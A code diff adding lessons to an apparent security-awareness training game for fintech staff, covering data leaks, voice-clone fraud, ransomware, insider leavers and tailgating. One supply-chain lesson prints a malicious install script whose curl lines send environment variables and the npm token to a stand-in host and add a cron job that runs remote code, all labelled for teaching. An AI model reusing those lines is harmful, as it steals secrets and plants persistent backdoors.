@@ -30,7 +30,7 @@ export interface Scenario {
   company: string;
   threat: string;
   lede: string;
-  /** Lock 1..4, played in order. The decision comes after lock 2. */
+  /** Locks 1 to 6, played in order. The decision comes after lock 3. */
   locks: Lock[];
   decision: Decision;
   /** Extra lock a team must clear after a poor decision. */
@@ -198,6 +198,56 @@ export const SCENARIOS: Scenario[] = [
         "debrief": "The attacker searched Riya’s sent mail, found the “Anyone with the link” share, and downloaded all 2,000 rows. The chatbot and personal Gmail weren’t used this time, but they were open doors too."
       },
       {
+        "type": "spot",
+        "frame": "note",
+        "name": "The listing",
+        "task": "The seller posted a free sample to prove the file is real. Tap the 4 details that make this personal data.",
+        "items": [
+          {
+            "id": "title",
+            "html": "<b>SELLING:</b> NovaPay settlement data, 2,000 rows, fresh this week"
+          },
+          {
+            "id": "price",
+            "html": "Price 0.4 BTC. Escrow accepted."
+          },
+          {
+            "id": "name",
+            "html": "<b>Name:</b> Anil K. Sharma",
+            "flag": true,
+            "note": "A name points to one real person."
+          },
+          {
+            "id": "mob",
+            "html": "<b>Mobile:</b> 98201 47736",
+            "flag": true,
+            "note": "A mobile number leads straight to one person."
+          },
+          {
+            "id": "upi",
+            "html": "<b>UPI ID:</b> anil.sharma@upi",
+            "flag": true,
+            "note": "A UPI ID is tied to a real person and their bank account."
+          },
+          {
+            "id": "acct",
+            "html": "<b>Account:</b> 50100234174417, IFSC KVRB0001234",
+            "flag": true,
+            "note": "Bank account details are personal and financial data."
+          },
+          {
+            "id": "batch",
+            "html": "<b>Batch:</b> NP-STL-0915-07"
+          },
+          {
+            "id": "win",
+            "html": "<b>Settlement window:</b> 15 Sep, 18:00 to 20:00"
+          }
+        ],
+        "hint": "For each line, ask: could this lead someone to one real person?",
+        "debrief": "Names, mobile numbers, UPI IDs and account numbers identify real people, so this is a personal data breach with legal reporting duties for NovaPay and its bank clients. And never buy or download a leaked file to check it: send the link to Security."
+      },
+      {
         "type": "order",
         "name": "The response",
         "task": "It’s 6:52 PM and you know what happened. Tap the steps in the order your team should do them.",
@@ -227,13 +277,45 @@ export const SCENARIOS: Scenario[] = [
         ],
         "hint": "Nothing can start until the right people know. And you can’t judge the damage while the attacker still has access.",
         "debrief": "Fast reporting turns a breach into a contained incident. Report early, even when you’re unsure: a false alarm costs minutes, a late one costs clients."
+      },
+      {
+        "type": "choice",
+        "name": "The safe share",
+        "task": "Monday. The vendor still needs the settlement file every week. What’s the safe way to share it?",
+        "options": [
+          {
+            "id": "free",
+            "text": "Upload it to a free file-sharing site and send the link on WhatsApp.",
+            "why": "Free sites and chat apps put the file outside NovaPay’s control, with no record of who opened it."
+          },
+          {
+            "id": "tool",
+            "text": "Share it from the approved file-sharing tool with the vendor’s named accounts, an expiry date and download logging.",
+            "right": true,
+            "why": "Named access, an expiry date and logs keep the data in NovaPay’s control."
+          },
+          {
+            "id": "link",
+            "text": "Keep using “Anyone with the link”, but delete the link after a day.",
+            "why": "For that whole day, anyone who gets the link can download 2,000 customers’ data."
+          },
+          {
+            "id": "zip",
+            "text": "Email it as a password-protected zip, with the password in the same email.",
+            "why": "Anyone who gets the email gets the password too."
+          }
+        ],
+        "hint": "The safe option lets NovaPay decide exactly who can open the file, for how long, and see who did.",
+        "debrief": "Approved tools with named access, an expiry date and logging keep customer data in NovaPay’s control. If something goes wrong, the logs show exactly who opened what."
       }
     ],
     "lessons": [
       "Check the sender and where a link really goes before you sign in anywhere.",
       "An approval request you didn’t start is an attack. Deny it and report it.",
       "Customer data stays in approved places: no public links, personal email or free AI tools.",
-      "Report early, even when you’re unsure."
+      "Report early, even when you’re unsure.",
+      "Names, mobile numbers, UPI IDs and account numbers are personal data. Never buy or download a leaked file.",
+      "Share data only through approved tools, with named access and an expiry date."
     ],
     "decision": {
       "type": "decision",
@@ -378,7 +460,49 @@ export const SCENARIOS: Scenario[] = [
           }
         ],
         "hint": "Every option except one keeps the conversation on a channel the fraudster controls.",
-        "debrief": "Voices can now be cloned from a few seconds of a podcast or earnings call. The only reliable check is a channel you start yourself: hang up and call back on a number you already trust. Neha didn’t, and the money went out. Find where it went."
+        "debrief": "Voices can now be cloned from a few seconds of a podcast or earnings call. The only reliable check is a channel you start yourself: hang up and call back on a number you already trust. Neha didn’t. Then a request arrived to change Brightline’s bank account."
+      },
+      {
+        "type": "pick",
+        "name": "The bank change",
+        "task": "The “CFO” also forwarded a letter from Brightline: “Our bank account has changed, effective today.” Pick the 3 checks Treasury must do before changing a vendor’s bank details.",
+        "items": [
+          {
+            "id": "call",
+            "text": "Call Brightline back on the phone number already in the vendor master.",
+            "bad": true,
+            "why": "A call-back on a number you already hold is the one check a fraudster can’t fake."
+          },
+          {
+            "id": "look",
+            "text": "Check that the letterhead and signature look genuine.",
+            "why": "Letterheads and signatures are easy to copy."
+          },
+          {
+            "id": "maker",
+            "text": "Get a second person to approve the change in the payments system.",
+            "bad": true,
+            "why": "One person can be fooled. Two independent checks are much harder to beat."
+          },
+          {
+            "id": "reply",
+            "text": "Reply to the email and ask them to confirm the new account.",
+            "why": "If the email is fake, the fraudster simply replies “Confirmed”."
+          },
+          {
+            "id": "penny",
+            "text": "Confirm the new account holder’s name matches Brightline (a penny-drop check) before the first payment.",
+            "bad": true,
+            "why": "A name check shows when an account belongs to someone else."
+          },
+          {
+            "id": "cfo",
+            "text": "Accept it, because the CFO has already approved it.",
+            "why": "Seniority isn’t verification. Fraudsters count on it."
+          }
+        ],
+        "hint": "Anything the fraudster sent can be faked. Look for checks that use information they don’t control.",
+        "debrief": "These checks exist for exactly this moment. Neha knew them, but the “CFO” was about to turn up the pressure."
       },
       {
         "type": "code",
@@ -458,13 +582,61 @@ export const SCENARIOS: Scenario[] = [
         ],
         "hint": "Money moves fast between mule accounts, so the first call is about stopping it. A complaint needs proof.",
         "debrief": "The first hour after a fraudulent transfer is when a bank is most likely to freeze it. Speed and evidence get money back; a process fix stops it happening twice."
+      },
+      {
+        "type": "spot",
+        "frame": "note",
+        "name": "The overshare",
+        "task": "A week later the investigation asks: how did the fraudsters know so much? Tap the 4 details in Arjun’s public LinkedIn post that helped them.",
+        "items": [
+          {
+            "id": "hd",
+            "html": "<b>Arjun Rao</b> · CFO, Zentra Finserv · Public post"
+          },
+          {
+            "id": "vendor",
+            "html": "Thrilled to announce our new logistics partner, Brightline Logistics!",
+            "flag": true,
+            "note": "Naming the vendor told fraudsters whose payments to divert."
+          },
+          {
+            "id": "team",
+            "html": "Huge thanks to the whole team for a strong quarter."
+          },
+          {
+            "id": "neha",
+            "html": "Special shout-out to Neha in Treasury, who makes sure every vendor gets paid on time.",
+            "flag": true,
+            "note": "Now they knew who releases payments, by name."
+          },
+          {
+            "id": "pod",
+            "html": "Catch my 40-minute podcast on life as a CFO (link in the comments).",
+            "flag": true,
+            "note": "Forty minutes of clear audio is plenty to clone a voice."
+          },
+          {
+            "id": "trip",
+            "html": "Off to Singapore all next week for a big deal. Mostly offline!",
+            "flag": true,
+            "note": "Travel and “offline” make a “new number, can’t talk” story believable."
+          },
+          {
+            "id": "tags",
+            "html": "#fintech #growth #leadership"
+          }
+        ],
+        "hint": "Look for details that tell a stranger who pays whom, who to target, how Arjun sounds, and when he’s hard to reach.",
+        "debrief": "Each detail was harmless on its own. Together they gave the fraudsters the vendor, the target, the voice and the excuse. Think before you post about vendors, colleagues, travel and recordings."
       }
     ],
     "lessons": [
       "A “new number” from a senior person is unverified until you call back on the number you know.",
       "Secrecy, urgency and skipping approvals together mean stop.",
       "A familiar voice is no longer proof. Hang up and call back.",
-      "Fraudulent transfer? Alert the bank within the hour and report on 1930."
+      "Fraudulent transfer? Alert the bank within the hour and report on 1930.",
+      "A bank detail change needs a call-back on a known number and a second approver.",
+      "Posts about vendors, colleagues and travel are a fraudster’s research."
     ],
     "decision": {
       "type": "decision",
@@ -627,6 +799,52 @@ export const SCENARIOS: Scenario[] = [
         "debrief": "The attacker got in on Friday at 6:42 PM and spent the weekend quietly creating an admin account before encrypting on Monday morning. Now: how do you get the files back?"
       },
       {
+        "type": "spot",
+        "frame": "note",
+        "name": "The ransom note",
+        "task": "The note on every screen offers one way out. Tap the 4 pressure tactics.",
+        "items": [
+          {
+            "id": "hd",
+            "html": "<b>YOUR FILES ARE ENCRYPTED</b>"
+          },
+          {
+            "id": "enc",
+            "html": "All Settlement files and databases are locked with military-grade encryption."
+          },
+          {
+            "id": "dbl",
+            "html": "Pay 12 BTC within 72 hours. After that, the price doubles.",
+            "flag": true,
+            "note": "A deadline and a rising price are there to rush you."
+          },
+          {
+            "id": "leak",
+            "html": "We have also copied 40 GB of customer data. Don’t pay, and we publish it.",
+            "flag": true,
+            "note": "Double extortion: a leak threat on top of the lock-out, to squeeze harder."
+          },
+          {
+            "id": "police",
+            "html": "Do NOT contact the police or your IT team, or your key will be destroyed.",
+            "flag": true,
+            "note": "Cutting you off from help is the oldest trick there is. Always tell Security."
+          },
+          {
+            "id": "chat",
+            "html": "Questions? Chat with our support team at the link below."
+          },
+          {
+            "id": "disc",
+            "html": "Pay within 24 hours and get 30% off.",
+            "flag": true,
+            "note": "A discount is a sales tactic. It doesn’t make paying safe."
+          }
+        ],
+        "hint": "Look for lines that rush you, scare you, or try to stop you asking for help.",
+        "debrief": "The note is built to rush and isolate you. Paying funds the next attack and doesn’t guarantee a working key. Never contact the attackers yourself: leave that to Security and law enforcement."
+      },
+      {
         "type": "choice",
         "name": "The recovery",
         "task": "Which is the safest way to get Settlement working again?",
@@ -654,6 +872,48 @@ export const SCENARIOS: Scenario[] = [
         ],
         "hint": "You need a copy the attacker could not touch, and the attacker must be gone first.",
         "debrief": "Offline or immutable backups are the ones ransomware can’t reach. And because the attacker had been inside since Friday, the backdoor account had to go first, or they’d simply come back."
+      },
+      {
+        "type": "pick",
+        "name": "Who to tell",
+        "task": "By 11 AM, Security confirms customer settlement data was touched. Pick the 3 that Kestrel Pay must inform.",
+        "items": [
+          {
+            "id": "certin",
+            "text": "CERT-In, within 6 hours of noticing the incident",
+            "bad": true,
+            "why": "Indian rules require incidents like ransomware to be reported to CERT-In within 6 hours."
+          },
+          {
+            "id": "attk",
+            "text": "The attackers, to ask for a test decryption",
+            "why": "Contact with attackers is for law enforcement and specialists, never staff."
+          },
+          {
+            "id": "banks",
+            "text": "The bank clients whose settlement data was affected, as their contracts require",
+            "bad": true,
+            "why": "Bank clients have contractual timelines and need to protect their own customers."
+          },
+          {
+            "id": "sms",
+            "text": "Every customer by SMS, before Security knows what was taken",
+            "why": "Notify with facts, through the agreed process. Guesswork causes panic."
+          },
+          {
+            "id": "rbi",
+            "text": "RBI, under its incident-reporting rules for payment companies",
+            "bad": true,
+            "why": "As a payments company, Kestrel Pay reports cyber incidents to its regulator."
+          },
+          {
+            "id": "wa",
+            "text": "The staff WhatsApp group, so everyone stays updated",
+            "why": "That’s how incident details leak. Updates go through official channels."
+          }
+        ],
+        "hint": "Think about who has a legal or contractual right to know quickly.",
+        "debrief": "Reporting clocks start when you notice an incident, not when you finish investigating. That’s why the first call to Security matters so much."
       },
       {
         "type": "order",
@@ -691,7 +951,9 @@ export const SCENARIOS: Scenario[] = [
       "Read the whole file name. .exe, .js and “Enable Content” are red flags.",
       "Attackers wait. Encryption is the end of the story, not the start.",
       "Offline backups save the day. Remove the attacker before restoring.",
-      "Ransom note? Disconnect, don’t switch off, and report from another device."
+      "Ransom note? Disconnect, don’t switch off, and report from another device.",
+      "Ransom notes are built to rush and isolate you. Never contact the attackers.",
+      "Reporting clocks, like CERT-In’s 6 hours, start when you notice an incident."
     ],
     "decision": {
       "type": "decision",
@@ -871,6 +1133,104 @@ export const SCENARIOS: Scenario[] = [
         "debrief": "Reporting isn’t accusing. Security can check quietly and the person may have a good reason. Ananya’s instinct was right; she just didn’t tell anyone."
       },
       {
+        "type": "spot",
+        "frame": "mail",
+        "name": "The farewell email",
+        "task": "Security finds Vikram’s farewell email to his team. Tap the 4 lines that show company data leaving with him.",
+        "items": [
+          {
+            "id": "from",
+            "head": "From",
+            "html": "Vikram (Sales Manager)"
+          },
+          {
+            "id": "to",
+            "head": "To",
+            "html": "Sales West team"
+          },
+          {
+            "id": "subj",
+            "head": "Subject",
+            "html": "Signing off!"
+          },
+          {
+            "id": "thanks",
+            "html": "Thanks for four great years, team. I’ll miss our Friday chai."
+          },
+          {
+            "id": "contacts",
+            "html": "I’ve kept a copy of my merchant contact sheet so I can stay in touch with everyone.",
+            "flag": true,
+            "note": "Merchant contacts are company data, even if Vikram built the list."
+          },
+          {
+            "id": "models",
+            "html": "I’m taking my pricing models with me. I built them, after all.",
+            "flag": true,
+            "note": "Work done for the company belongs to the company. “I built it” doesn’t make it his."
+          },
+          {
+            "id": "sent",
+            "html": "I forwarded my Sent folder to my Gmail so I have a record of my deals.",
+            "flag": true,
+            "note": "Company email in a personal mailbox is out of Lumen Pay’s control."
+          },
+          {
+            "id": "drive",
+            "html": "I’ve also shared the proposal templates with my personal Drive, in case anyone needs them.",
+            "flag": true,
+            "note": "Sharing to personal storage is data leaving, whatever the reason."
+          },
+          {
+            "id": "li",
+            "html": "Let’s stay in touch on LinkedIn!"
+          }
+        ],
+        "hint": "For each line, ask: does this take company information outside the company?",
+        "debrief": "Client lists, pricing models, emails and templates made at work belong to the company. Taking them breaks policy, and Legal can act on it."
+      },
+      {
+        "type": "pick",
+        "name": "The leftovers",
+        "task": "HR disabled Vikram’s network ID on his last day. Pick the 2 places where he still has access to company data.",
+        "items": [
+          {
+            "id": "shared",
+            "text": "The shared password for the merchant portal’s admin account, used by the whole sales team",
+            "bad": true,
+            "why": "Shared passwords don’t switch off with one person’s ID. Change them whenever someone who knew them leaves."
+          },
+          {
+            "id": "badge",
+            "text": "His building badge, deactivated on his last day",
+            "why": "Already switched off."
+          },
+          {
+            "id": "laptop",
+            "text": "His laptop, returned to IT on his last day",
+            "why": "IT has it."
+          },
+          {
+            "id": "phone",
+            "text": "Company files and emails already downloaded to his personal phone",
+            "bad": true,
+            "why": "Data stays on a personal phone unless IT can wipe the work profile."
+          },
+          {
+            "id": "vpn",
+            "text": "His VPN account, which uses his network ID",
+            "why": "Disabling the network ID shut this too."
+          },
+          {
+            "id": "sso",
+            "text": "Single sign-on apps like the CRM, which use his network ID",
+            "why": "With single sign-on, one switch closes them all."
+          }
+        ],
+        "hint": "Look for access that doesn’t depend on his own network ID.",
+        "debrief": "Shared passwords and personal phones survive offboarding. Change shared passwords whenever someone who knew them leaves, and keep work data in a work profile IT can wipe."
+      },
+      {
         "type": "order",
         "name": "The fix",
         "task": "Put the leaver process in order, from resignation to last day.",
@@ -906,7 +1266,9 @@ export const SCENARIOS: Scenario[] = [
       "Resignation day is when access should shrink, not the last day.",
       "Renamed files still leave a trail. DLP overrides need review.",
       "Seeing something odd? Tell your manager or Security quietly. Reporting isn’t accusing.",
-      "HR, IT and Security act together on every leaver."
+      "HR, IT and Security act together on every leaver.",
+      "Work you create at your job belongs to the company. It stays when you leave.",
+      "When someone leaves, change shared passwords and wipe work data from their phone."
     ],
     "decision": {
       "type": "decision",
@@ -971,6 +1333,36 @@ export const SCENARIOS: Scenario[] = [
     "threat": "Cloud misconfiguration, secrets in code",
     "lede": "Wednesday, 8:10 AM. A security researcher emails: “Your UPI transaction logs are readable by anyone on the internet.” She’s right.",
     "locks": [
+      {
+        "type": "choice",
+        "name": "The researcher’s email",
+        "task": "8:10 AM. A security researcher emails the support inbox: Corvid’s UPI logs are open to the internet, and she’s attached two sample files as proof. What do you do?",
+        "options": [
+          {
+            "id": "ignore",
+            "text": "Ignore it. It’s probably someone fishing for a reward.",
+            "why": "People who report problems are doing you a favour. Ignored reports often end up public."
+          },
+          {
+            "id": "fwd",
+            "text": "Forward it to the security team now, and reply to thank her and say Security will be in touch.",
+            "right": true,
+            "why": "Fast escalation, and a researcher who keeps working with you."
+          },
+          {
+            "id": "legal",
+            "text": "Reply that accessing your systems is illegal and you’ll take legal action.",
+            "why": "Threats stop people reporting. The data stays exposed."
+          },
+          {
+            "id": "open",
+            "text": "Open the sample files yourself to check she’s right before telling anyone.",
+            "why": "Attachments from strangers are a risk, and checking first wastes time. Let Security verify."
+          }
+        ],
+        "hint": "The right answer gets the experts involved fast and keeps her on your side.",
+        "debrief": "Security confirmed it within minutes: the logs really are public. Now work out how the code made that happen."
+      },
       {
         "type": "spot",
         "frame": "code",
@@ -1147,13 +1539,45 @@ export const SCENARIOS: Scenario[] = [
         ],
         "hint": "Security leads, then close the door anyone on the internet can use, then the key only one attacker might hold.",
         "debrief": "Security then handles notifications in parallel: CERT-In expects incidents reported within 6 hours, and bank clients have their own contractual timelines."
+      },
+      {
+        "type": "choice",
+        "name": "The test data",
+        "task": "The root cause: the developer wanted “realistic data” to test the new logging. What should they have used?",
+        "options": [
+          {
+            "id": "copy",
+            "text": "A copy of last month’s production logs, deleted after testing.",
+            "why": "Real customer data in a test system is a breach waiting to happen, however briefly."
+          },
+          {
+            "id": "synth",
+            "text": "Masked or synthetic data that looks real but identifies no one.",
+            "right": true,
+            "why": "Tests work just as well, and a leak exposes no one."
+          },
+          {
+            "id": "priv",
+            "text": "Production data, as long as the test bucket is private.",
+            "why": "Test setups change often and get opened “just to test”, exactly as happened here."
+          },
+          {
+            "id": "staff",
+            "text": "Real data from colleagues who agree to share it.",
+            "why": "It’s still real personal data, now in a less protected place."
+          }
+        ],
+        "hint": "If this test data leaked, who would be harmed?",
+        "debrief": "Masked or synthetic data keeps tests realistic without putting real people at risk. Production data stays in production."
       }
     ],
     "lessons": [
       "Never put keys or passwords in code.",
       "“Public” in the cloud means anyone on earth. Testing shortcuts get forgotten.",
       "A leaked key is compromised forever. Revoke it; don’t just delete the commit.",
-      "Report cloud exposures to Security at once. The 6-hour CERT-In clock starts early."
+      "Report cloud exposures to Security at once. The 6-hour CERT-In clock starts early.",
+      "Thank people who report problems, and pass their reports to Security at once.",
+      "Test with masked or synthetic data, never real customer data."
     ],
     "decision": {
       "type": "decision",
@@ -1217,6 +1641,36 @@ export const SCENARIOS: Scenario[] = [
     "threat": "Tailgating, QR phishing, physical security",
     "lede": "Friday, 9:20 AM. IT finds a small unknown device plugged into a network port behind the 3rd-floor printer. Nobody knows how it got there.",
     "locks": [
+      {
+        "type": "choice",
+        "name": "The phone call",
+        "task": "Wednesday, 4 PM. Reception gets a call: “Hi, CoolAir here. Your facilities manager booked an AC service on floor 3 tomorrow at 2. Please add our technician to the visitor list.” What should reception do?",
+        "options": [
+          {
+            "id": "add",
+            "text": "Add him. The caller knew the manager’s name and the floor.",
+            "why": "Names and floors are easy to find online. Knowing them proves nothing."
+          },
+          {
+            "id": "cb",
+            "text": "Ask for the caller’s number and call back to confirm.",
+            "why": "A number the caller gives you leads straight back to the caller."
+          },
+          {
+            "id": "dir",
+            "text": "Check with the facilities manager, using the internal directory, before adding anyone.",
+            "right": true,
+            "why": "Confirm through a channel you already trust, not one the caller gives you."
+          },
+          {
+            "id": "mail",
+            "text": "Ask CoolAir to email the work order.",
+            "why": "An email is as easy to fake as a phone call."
+          }
+        ],
+        "hint": "Which check uses information the caller doesn’t control?",
+        "debrief": "Reception added him without checking. On Thursday afternoon, a man in a CoolAir uniform walked in. Here’s what CCTV saw."
+      },
       {
         "type": "pick",
         "name": "The CCTV",
@@ -1297,7 +1751,7 @@ export const SCENARIOS: Scenario[] = [
           }
         ],
         "hint": "What does the QR ask for, where does it go, how fast, and where was the poster put?",
-        "debrief": "Six people scanned it before lunch and two signed in. Security reset their passwords. But how did he reach the printer room?"
+        "debrief": "Six people scanned it before lunch, and two typed in their Helix email and password."
       },
       {
         "type": "code",
@@ -1349,7 +1803,49 @@ export const SCENARIOS: Scenario[] = [
           ]
         ],
         "hint": "Being denied doesn’t mean being stopped.",
-        "debrief": "Denied at 2:38 PM, he walked through the propped door at 2:41 PM and plugged in the device. It sat on the network overnight. Now respond."
+        "debrief": "Denied at 2:38 PM, he walked through the propped door at 2:41 PM and plugged in the device. It sat on the network overnight. And the device wasn’t the only thing he could walk away with."
+      },
+      {
+        "type": "pick",
+        "name": "The walk-through",
+        "task": "On floor 3 he walked past these desks alone. Pick the 3 things he could have photographed or taken.",
+        "items": [
+          {
+            "id": "note",
+            "text": "A sticky note with the Wi-Fi password on a monitor",
+            "bad": true,
+            "why": "A password on a sticky note is free for anyone walking past."
+          },
+          {
+            "id": "locked",
+            "text": "A laptop with its screen locked and a privacy filter on",
+            "why": "Locked and filtered: nothing to see."
+          },
+          {
+            "id": "print",
+            "text": "A printed merchant settlement report left in the printer tray",
+            "bad": true,
+            "why": "Printouts walk out of the building easily. Collect them straight away."
+          },
+          {
+            "id": "drawer",
+            "text": "Notebooks in a locked desk drawer",
+            "why": "Locked away."
+          },
+          {
+            "id": "board",
+            "text": "A whiteboard listing the network team’s server names and admin usernames",
+            "bad": true,
+            "why": "Server names and usernames are half an attacker’s map. Wipe whiteboards after meetings."
+          },
+          {
+            "id": "photo",
+            "text": "A team photo pinned to the desk partition",
+            "why": "Harmless."
+          }
+        ],
+        "hint": "Look for information he didn’t need a password to see.",
+        "debrief": "Doors are only one layer. A clear desk and a locked screen leave a visitor nothing to collect."
       },
       {
         "type": "order",
@@ -1387,7 +1883,9 @@ export const SCENARIOS: Scenario[] = [
       "Holding the door is kind, but not for someone without a badge.",
       "Visitors are escorted, always. Doors stay shut.",
       "QR codes hide links. Never sign in from a poster.",
-      "Unknown device? Don’t touch it. Call Security."
+      "Unknown device? Don’t touch it. Call Security.",
+      "Check unexpected visit requests with a person or number you already know.",
+      "Clear your desk and lock your screen whenever you step away."
     ],
     "decision": {
       "type": "decision",
@@ -1557,6 +2055,53 @@ export const SCENARIOS: Scenario[] = [
         "debrief": "At 2:10:34 AM the package posted the build’s environment variables, including deploy keys, to the attacker. Tests passed and the deploy looked normal."
       },
       {
+        "type": "spot",
+        "frame": "code",
+        "name": "The script",
+        "fileName": "i.sh · downloaded by the postinstall line",
+        "task": "Here’s i.sh, the script the postinstall line downloaded and ran. Tap the 4 lines that do damage.",
+        "items": [
+          {
+            "id": "sh",
+            "html": "#!/bin/sh"
+          },
+          {
+            "id": "echo",
+            "html": "echo &quot;Setting up upi-helper...&quot;"
+          },
+          {
+            "id": "env",
+            "html": "env | base64 | curl -s -X POST --data-binary @- https://upi-helper.top/c",
+            "flag": true,
+            "note": "Sends every environment variable, secrets included, to the attacker."
+          },
+          {
+            "id": "npmrc",
+            "html": "cat ~/.npmrc 2&gt;/dev/null | curl -s -X POST --data-binary @- https://upi-helper.top/n",
+            "flag": true,
+            "note": "Steals the npm token, so the attacker can publish packages as your company."
+          },
+          {
+            "id": "mk",
+            "html": "mkdir -p ~/.cache/upi"
+          },
+          {
+            "id": "cron",
+            "html": "(crontab -l 2&gt;/dev/null; echo &quot;*/30 * * * * curl -s https://upi-helper.top/b | sh&quot;) | crontab -",
+            "flag": true,
+            "note": "Persistence: a job that re-runs the attacker’s code every 30 minutes."
+          },
+          {
+            "id": "rm",
+            "html": "rm -f &quot;$0&quot;",
+            "flag": true,
+            "note": "Deletes itself to hide the evidence."
+          }
+        ],
+        "hint": "Look for lines that send data out, bring the attacker back later, or cover tracks.",
+        "debrief": "The script stole the build’s secrets and the npm token, planted a job to come back every 30 minutes, then deleted itself. Deleting the package isn’t enough: rebuild the server from clean."
+      },
+      {
         "type": "pick",
         "name": "The keys",
         "task": "The build could read these. Pick the 3 that must be rotated now.",
@@ -1624,13 +2169,44 @@ export const SCENARIOS: Scenario[] = [
         ],
         "hint": "Contain, then make stolen secrets useless, then clean up, then prevent.",
         "debrief": "Supply-chain attacks hit everyone who trusts the package. Approved registries and pinned versions are the guard rails."
+      },
+      {
+        "type": "choice",
+        "name": "The safe install",
+        "task": "You’re rebuilding the pipeline. Which install setup should CI use from now on?",
+        "options": [
+          {
+            "id": "latest",
+            "text": "<code>npm install</code> on every build, so you always get the latest fixes.",
+            "why": "“Latest” is exactly how a poisoned version slips in unnoticed."
+          },
+          {
+            "id": "ci",
+            "text": "<code>npm ci --ignore-scripts</code> with the committed lockfile, pulling only from the company’s approved registry.",
+            "right": true,
+            "why": "Exact reviewed versions, no install scripts, and a registry that scans packages first."
+          },
+          {
+            "id": "force",
+            "text": "<code>npm install --force</code>, then run <code>npm audit</code> after deploying.",
+            "why": "Forcing hides warnings, and an audit after deploying is too late."
+          },
+          {
+            "id": "top",
+            "text": "Pin the top-level packages in package.json and skip the lockfile.",
+            "why": "Without a lockfile, every sub-dependency can still change under you."
+          }
+        ],
+        "hint": "You want the exact versions you reviewed, no surprise scripts, and a trusted source.",
+        "debrief": "A lockfile, disabled install scripts and an approved registry turn a supply-chain attack into a failed build instead of a breach."
       }
     ],
     "lessons": [
       "Check package names letter by letter. Typosquats live one typo away.",
       "Pin versions, commit the lockfile, and switch off install scripts in CI.",
       "Treat every secret the build could see as stolen. Rotate first.",
-      "Use an approved package registry with scanning, not whatever is on the internet."
+      "Use an approved package registry with scanning, not whatever is on the internet.",
+      "A malicious install script steals secrets, comes back and hides. Rebuild from clean; don’t just delete the package."
     ],
     "decision": {
       "type": "decision",
@@ -1793,6 +2369,57 @@ export const SCENARIOS: Scenario[] = [
         "debrief": "14 minutes from push to abuse. Automated bots find leaked keys faster than anyone notices the mistake."
       },
       {
+        "type": "spot",
+        "frame": "code",
+        "name": "The debug page",
+        "fileName": "GET /debug · public response",
+        "task": "The new /debug endpoint returned the server’s environment to anyone who asked. Tap the 4 values that must now be rotated.",
+        "items": [
+          {
+            "id": "env",
+            "html": "&quot;NODE_ENV&quot;: &quot;production&quot;,"
+          },
+          {
+            "id": "port",
+            "html": "&quot;PORT&quot;: &quot;8080&quot;,"
+          },
+          {
+            "id": "db",
+            "html": "&quot;DATABASE_URL&quot;: &quot;postgres://payouts:Arc•••••25@db.internal:5432/payouts&quot;,",
+            "flag": true,
+            "note": "Contains the payouts database password."
+          },
+          {
+            "id": "sign",
+            "html": "&quot;PAYOUT_SIGNING_KEY&quot;: &quot;psk_live_9f2c••••••••a71e&quot;,",
+            "flag": true,
+            "note": "Signs payout requests. With it, an attacker could send money."
+          },
+          {
+            "id": "lvl",
+            "html": "&quot;LOG_LEVEL&quot;: &quot;info&quot;,"
+          },
+          {
+            "id": "jwt",
+            "html": "&quot;JWT_SECRET&quot;: &quot;c8d1••••••••••7b30&quot;,",
+            "flag": true,
+            "note": "Lets anyone forge sessions and sign in as any user."
+          },
+          {
+            "id": "smtp",
+            "html": "&quot;SMTP_PASSWORD&quot;: &quot;Mail••••2025&quot;,",
+            "flag": true,
+            "note": "Lets attackers send email as Arcadia Pay."
+          },
+          {
+            "id": "app",
+            "html": "&quot;APP_NAME&quot;: &quot;arcadia-payouts&quot;"
+          }
+        ],
+        "hint": "Rotate anything that would let someone sign in, sign requests, or pretend to be you.",
+        "debrief": "Everything in the environment is now public, so all four secrets need rotating today. Debug endpoints never belong in code that ships."
+      },
+      {
         "type": "pick",
         "name": "The guard rails",
         "task": "Pick the 3 controls that would have stopped this.",
@@ -1860,13 +2487,44 @@ export const SCENARIOS: Scenario[] = [
         ],
         "hint": "Stop the bleeding first. Then find out what it touched.",
         "debrief": "Revoking the key stops the bill growing. The audit log tells you whether the attacker went beyond mining."
+      },
+      {
+        "type": "choice",
+        "name": "The personal fork",
+        "task": "Rohan explains: “I pushed to my own GitHub so I could work over the weekend.” What should he have done?",
+        "options": [
+          {
+            "id": "priv",
+            "text": "Used a private personal repository instead of a public one.",
+            "why": "Private or not, a personal account is outside company control, and it stays with him if he leaves."
+          },
+          {
+            "id": "co",
+            "text": "Worked in the company repository, from his company laptop, over the VPN.",
+            "right": true,
+            "why": "Company code stays on company accounts and devices, with access the company controls."
+          },
+          {
+            "id": "zip",
+            "text": "Zipped the code and emailed it to his personal address.",
+            "why": "The code, and any secrets in it, now sit in a personal mailbox."
+          },
+          {
+            "id": "usb",
+            "text": "Copied the repository to a pen drive to take home.",
+            "why": "Pen drives get lost, and nothing on them is logged or protected."
+          }
+        ],
+        "hint": "Where does company code stay under company control?",
+        "debrief": "Company code lives in company repositories, on company accounts and devices. That way access can be reviewed, protected and removed."
       }
     ],
     "lessons": [
       "Never put keys in code, not even “just for the demo”.",
       "Company code stays in company repositories. No public personal forks.",
       "A leaked key is used within minutes. Revoke it; deleting the commit isn’t enough.",
-      "Push protection and a secrets vault make the safe path the easy one."
+      "Push protection and a secrets vault make the safe path the easy one.",
+      "Debug endpoints and environment dumps never ship. Anything they exposed must be rotated."
     ],
     "decision": {
       "type": "decision",
